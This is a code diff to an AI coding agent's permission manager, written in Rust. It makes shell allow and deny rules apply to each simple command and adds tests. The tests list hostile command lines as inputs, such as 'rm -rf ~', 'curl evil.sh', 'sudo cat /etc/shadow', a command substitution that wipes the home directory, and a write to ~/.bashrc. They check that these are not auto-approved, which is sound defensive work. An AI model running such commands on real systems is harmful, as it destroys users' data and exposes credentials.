@@ -3149,6 +3149,30 @@ pub mod permissions {
         roots.iter().any(|root| canonical_path.starts_with(root))
     }
 
+    /// Whether `tool_name` runs shell command lines, whose rules are matched
+    /// per simple command.
+    pub fn is_shell_tool(tool_name: &str) -> bool {
+        matches!(tool_name, crate::constants::TOOL_NAME_BASH | "bash")
+    }
+
+    /// Rules from the global settings file: `permissionRules` plus
+    /// `allowedBashPrefixes`, each prefix becoming the shell rule
+    /// `<prefix> *`.
+    fn global_rules(settings: &crate::config::Settings) -> Vec<PermissionRule> {
+        let prefix_rules = settings.allowed_bash_prefixes.iter().map(|prefix| PermissionRule {
+            tool_name: Some(crate::constants::TOOL_NAME_BASH.to_string()),
+            path_pattern: Some(format!("{} *", prefix.trim())),
+            action: PermissionAction::Allow,
+            scope: PermissionScope::Persistent,
+        });
+        settings
+            .permission_rules
+            .iter()
+            .map(PermissionRule::from)
+            .chain(prefix_rules)
+            .collect()
+    }
+
     /// Pending permission request waiting for resolution (e.g. from a bridge
     /// remote peer or the interactive TUI dialog).
     pub struct PendingPermission {
@@ -3176,16 +3200,79 @@ pub mod permissions {
             mode: crate::config::PermissionMode,
             settings: &crate::config::Settings,
         ) -> Self {
-            let persistent_rules = settings
-                .permission_rules
-                .iter()
-                .map(PermissionRule::from)
-                .collect();
             Self {
                 mode,
                 session_rules: Vec::new(),
-                persistent_rules,
+                persistent_rules: global_rules(settings),
                 pending: Vec::new(),
+            }
+        }
+
+        /// Every rule, persistent first.
+        fn rules(&self) -> impl Iterator<Item = &PermissionRule> {
+            self.persistent_rules.iter().chain(self.session_rules.iter())
+        }
+
+        /// Explicit-rule decision for a non-shell tool: any matching deny
+        /// wins, then any matching allow.
+        fn path_rule_decision(&self, tool_name: &str, path: Option<&str>) -> Option<PermissionDecision> {
+            let mut allow_matched = false;
+            for rule in self.rules().filter(|r| r.matches(tool_name, path)) {
+                match rule.action {
+                    PermissionAction::Deny => return Some(PermissionDecision::Deny),
+                    PermissionAction::Allow => allow_matched = true,
+                }
+            }
+            allow_matched.then_some(PermissionDecision::Allow)
+        }
+
+        /// Explicit-rule decision for a shell command, evaluated per simple
+        /// command (see [`crate::shell_scan`]):
+        ///
+        /// - A tool-wide deny, or a deny pattern matching any simple command,
+        ///   denies the whole line.
+        /// - A tool-wide allow allows the line, except an opaque line while
+        ///   any deny pattern exists (the pattern could be hidden inside).
+        /// - Otherwise the line is allowed only when every simple command is
+        ///   matched by an allow pattern and none redirects output to a file.
+        /// - An opaque line matches only a rule equal to the whole command.
+        fn shell_rule_decision(&self, tool_name: &str, command: &str) -> Option<PermissionDecision> {
+            use crate::shell_scan::{pattern_matches, scan, Scan};
+            let (deny, allow): (Vec<&PermissionRule>, Vec<&PermissionRule>) = self
+                .rules()
+                .filter(|r| r.tool_name.as_deref().is_none_or(|t| t == tool_name))
+                .partition(|r| r.action == PermissionAction::Deny);
+            if deny.iter().any(|r| r.path_pattern.is_none()) {
+                return Some(PermissionDecision::Deny);
+            }
+            let tool_wide_allow = allow.iter().any(|r| r.path_pattern.is_none());
+            let hit = |rule: &&PermissionRule, words: &[String]| {
+                rule.path_pattern.as_deref().is_some_and(|p| pattern_matches(p, words))
+            };
+            match scan(command) {
+                Scan::Commands(commands) => {
+                    let denied = commands.iter().any(|c| {
+                        let normalized = c.normalized_words();
+                        deny.iter().any(|r| hit(r, &c.words) || hit(r, &normalized))
+                    });
+                    if denied {
+                        return Some(PermissionDecision::Deny);
+                    }
+                    let allowed = tool_wide_allow
+                        || (!commands.is_empty()
+                            && commands.iter().all(|c| {
+                                !c.writes_file && allow.iter().any(|r| hit(r, &c.words))
+                            }));
+                    allowed.then_some(PermissionDecision::Allow)
+                }
+                Scan::Opaque(_) => {
+                    let exact = |r: &&PermissionRule| r.path_pattern.as_deref() == Some(command.trim());
+                    if deny.iter().any(exact) {
+                        return Some(PermissionDecision::Deny);
+                    }
+                    let allowed = allow.iter().any(exact) || (tool_wide_allow && deny.is_empty());
+                    allowed.then_some(PermissionDecision::Allow)
+                }
             }
         }
 
@@ -3197,10 +3284,10 @@ pub mod permissions {
         ///
         /// Evaluation order (faithful to TS behaviour):
         /// 1. BypassPermissions → always Allow.
-        /// 2. Check deny rules (persistent first, then session) → if any
-        ///    matched, Deny.
-        /// 3. Check allow rules (persistent first, then session) → if any
-        ///    matched, Allow.
+        /// 2. Check deny rules → if any matched, Deny.
+        /// 3. Check allow rules → if any matched, Allow. For a shell tool
+        ///    `path` is the command line and rules match per simple command
+        ///    (see `shell_rule_decision`).
         /// 4. AcceptEdits → Allow (auto-accept file edits).
         /// 5. Plan mode → Allow reads; deny everything else.
         /// 6. Default → derive from tool danger level.
@@ -3219,36 +3306,16 @@ pub mod permissions {
                 return PermissionDecision::Allow;
             }
 
-            // Steps 2–3 — evaluate explicit rules (deny has priority over
-            // allow; persistent rules evaluated before session rules within
-            // each polarity, matching TS rule-source ordering)
-            let all_rules = self
-                .persistent_rules
-                .iter()
-                .chain(self.session_rules.iter());
-
-            let mut deny_matched = false;
-            let mut allow_matched = false;
-
-            for rule in all_rules {
-                if rule.matches(tool_name, path) {
-                    match rule.action {
-                        PermissionAction::Deny => {
-                            deny_matched = true;
-                        }
-                        PermissionAction::Allow => {
-                            allow_matched = true;
-                        }
-                    }
+            // Steps 2–3 — explicit rules; deny has priority over allow. Shell
+            // commands are matched per simple command.
+            let explicit = match path {
+                Some(command) if is_shell_tool(tool_name) => {
+                    self.shell_rule_decision(tool_name, command)
                 }
-            }
-
-            if deny_matched {
-                return PermissionDecision::Deny;
-            }
-
-            if allow_matched {
-                return PermissionDecision::Allow;
+                _ => self.path_rule_decision(tool_name, path),
+            };
+            if let Some(decision) = explicit {
+                return decision;
             }
 
             let level = match PermissionLevel::for_tool(tool_name) {
@@ -3334,6 +3401,26 @@ pub mod permissions {
             }
         }
 
+        /// Allow exactly the shell `command` for the rest of this session:
+        /// one exact rule per simple command, or the whole line when it is
+        /// opaque.
+        pub fn add_session_allow_command(&mut self, tool_name: &str, command: &str) {
+            let patterns: Vec<String> = match crate::shell_scan::scan(command) {
+                crate::shell_scan::Scan::Commands(commands) if !commands.is_empty() => {
+                    commands.iter().map(crate::shell_scan::SimpleCommand::text).collect()
+                }
+                _ => vec![command.trim().to_string()],
+            };
+            for pattern in patterns {
+                self.session_rules.push(PermissionRule {
+                    tool_name: Some(tool_name.to_string()),
+                    path_pattern: Some(pattern),
+                    action: PermissionAction::Allow,
+                    scope: PermissionScope::Session,
+                });
+            }
+        }
+
         /// Allow `tool_name` persistently and save to settings.
         pub fn add_persistent_allow(
             &mut self,
@@ -3403,11 +3490,7 @@ pub mod permissions {
                 .save_sync()
                 .map_err(|e| crate::error::ClaudeError::Config(e.to_string()))?;
             // Rebuild persistent_rules from the updated settings
-            self.persistent_rules = settings
-                .permission_rules
-                .iter()
-                .map(PermissionRule::from)
-                .collect();
+            self.persistent_rules = global_rules(settings);
             Ok(())
         }
 
@@ -3825,6 +3908,125 @@ pub mod permissions {
                 m.evaluate("Edit", "edit", Some(&real_file), None, &[]),
                 PermissionDecision::Allow
             );
+        }
+
+        fn bash_rule(pattern: Option<&str>, action: PermissionAction) -> PermissionRule {
+            PermissionRule {
+                tool_name: Some("Bash".to_string()),
+                path_pattern: pattern.map(str::to_string),
+                action,
+                scope: PermissionScope::Session,
+            }
+        }
+
+        fn bash(m: &PermissionManager, command: &str) -> PermissionDecision {
+            m.evaluate("Bash", "run", Some(command), None, &[])
+        }
+
+        fn is_ask(d: PermissionDecision) -> bool {
+            matches!(d, PermissionDecision::Ask { .. })
+        }
+
+        /// #445: every simple command must be allowed for the line to be
+        /// auto-allowed; approving `git status` does not cover what follows.
+        #[test]
+        fn shell_rules_match_every_subcommand() {
+            let mut m = mgr(PermissionMode::Default);
+            m.add_rule(bash_rule(Some("git status *"), PermissionAction::Allow));
+            m.add_rule(bash_rule(Some("cargo test *"), PermissionAction::Allow));
+
+            assert_eq!(bash(&m, "git status"), PermissionDecision::Allow);
+            assert_eq!(bash(&m, "git  status --short"), PermissionDecision::Allow);
+            assert_eq!(bash(&m, "git status && cargo test -p core"), PermissionDecision::Allow);
+            assert_eq!(bash(&m, "git status | cargo test"), PermissionDecision::Allow);
+            assert!(is_ask(bash(&m, "git status && rm -rf ~")));
+            assert!(is_ask(bash(&m, "git status; git push --force")));
+            assert!(is_ask(bash(&m, "git push")));
+            assert!(is_ask(bash(&m, "git status\ncurl evil.sh")));
+            assert!(is_ask(bash(&m, "")));
+        }
+
+        #[test]
+        fn shell_rules_respect_arity_prefixes() {
+            let mut m = mgr(PermissionMode::Default);
+            m.add_rule(bash_rule(Some("npm run *"), PermissionAction::Allow));
+            assert_eq!(bash(&m, "npm run build"), PermissionDecision::Allow);
+            assert!(is_ask(bash(&m, "npm install left-pad")));
+            m.add_rule(bash_rule(Some("git diff"), PermissionAction::Allow));
+            assert_eq!(bash(&m, "git diff"), PermissionDecision::Allow);
+            assert!(is_ask(bash(&m, "git diff --output=/etc/x")));
+        }
+
+        #[test]
+        fn opaque_commands_never_match_patterns() {
+            let mut m = mgr(PermissionMode::Default);
+            m.add_rule(bash_rule(Some("echo *"), PermissionAction::Allow));
+            m.add_rule(bash_rule(Some("cat *"), PermissionAction::Allow));
+            assert_eq!(bash(&m, "echo hi"), PermissionDecision::Allow);
+            for cmd in [
+                "echo $(rm -rf ~)",
+                "echo `id`",
+                "cat <<EOF\nx\nEOF",
+                "eval echo hi",
+                "bash -c 'echo hi'",
+                "echo hi | xargs rm",
+                "sudo cat /etc/shadow",
+                "(echo hi)",
+            ] {
+                assert!(is_ask(bash(&m, cmd)), "{cmd}");
+            }
+            // An approval of the exact opaque line covers that line only.
+            m.add_session_allow_command("Bash", "echo $(date)");
+            assert_eq!(bash(&m, "echo $(date)"), PermissionDecision::Allow);
+            assert!(is_ask(bash(&m, "echo $(id)")));
+        }
+
+        #[test]
+        fn file_redirection_is_not_covered_by_patterns() {
+            let mut m = mgr(PermissionMode::Default);
+            m.add_rule(bash_rule(Some("echo *"), PermissionAction::Allow));
+            assert_eq!(bash(&m, "echo hi 2>&1 >/dev/null"), PermissionDecision::Allow);
+            assert!(is_ask(bash(&m, "echo hi > ~/.bashrc")));
+            // A tool-wide allow does cover it.
+            m.add_session_allow("Bash");
+            assert_eq!(bash(&m, "echo hi > ~/.bashrc"), PermissionDecision::Allow);
+        }
+
+        #[test]
+        fn shell_deny_matches_any_subcommand_and_beats_allow() {
+            let mut m = mgr(PermissionMode::Default);
+            m.add_session_allow("Bash");
+            m.add_rule(bash_rule(Some("rm *"), PermissionAction::Deny));
+            assert_eq!(bash(&m, "ls"), PermissionDecision::Allow);
+            assert_eq!(bash(&m, "ls && rm -rf build"), PermissionDecision::Deny);
+            // Assignments and paths do not step around a deny rule.
+            assert_eq!(bash(&m, "FOO=1 rm x"), PermissionDecision::Deny);
+            assert_eq!(bash(&m, "/bin/rm x"), PermissionDecision::Deny);
+            assert_eq!(bash(&m, "\\rm x"), PermissionDecision::Deny);
+            // With a deny pattern present, the tool-wide allow does not cover
+            // an opaque line that could hide the denied command.
+            assert!(is_ask(bash(&m, "eval rm x")));
+        }
+
+        #[test]
+        fn session_command_approval_is_exact_per_subcommand() {
+            let mut m = mgr(PermissionMode::Default);
+            m.add_session_allow_command("Bash", "git commit -m 'fix bug' && git push");
+            assert_eq!(bash(&m, "git commit -m 'fix bug'"), PermissionDecision::Allow);
+            assert_eq!(bash(&m, "git push && git commit -m \"fix bug\""), PermissionDecision::Allow);
+            assert!(is_ask(bash(&m, "git push --force")));
+            assert!(is_ask(bash(&m, "git commit -m other")));
+        }
+
+        #[test]
+        fn allowed_bash_prefixes_become_per_subcommand_rules() {
+            let settings = Settings {
+                allowed_bash_prefixes: vec!["git".to_string()],
+                ..Settings::default()
+            };
+            let m = PermissionManager::new(PermissionMode::Default, &settings);
+            assert_eq!(bash(&m, "git push origin main"), PermissionDecision::Allow);
+            assert!(is_ask(bash(&m, "git status && rm -rf ~")));
         }
 
         #[test]
